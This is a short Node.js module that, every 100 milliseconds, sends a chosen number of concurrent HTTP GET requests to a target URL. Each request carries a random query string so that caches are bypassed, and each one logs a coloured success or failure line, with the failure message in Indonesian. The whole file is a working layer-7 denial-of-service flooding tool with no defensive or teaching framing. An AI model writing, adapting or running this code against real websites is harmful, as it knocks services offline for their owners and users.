const axios = require('axios');
const chalk = require('chalk');

module.exports = function(target, threads) {
  setInterval(() => {
    for (let i = 0; i < threads; i++) {
      const random = Math.random().toString(36).substring(2, 10);
      axios.get(`${target}?q=${random}`)
        .then(() => console.log(chalk.green(`[✓] QUERY ${random}`)))
        .catch(() => console.log(chalk.red(`[x] Gagal query`)));
    }
  }, 100);
};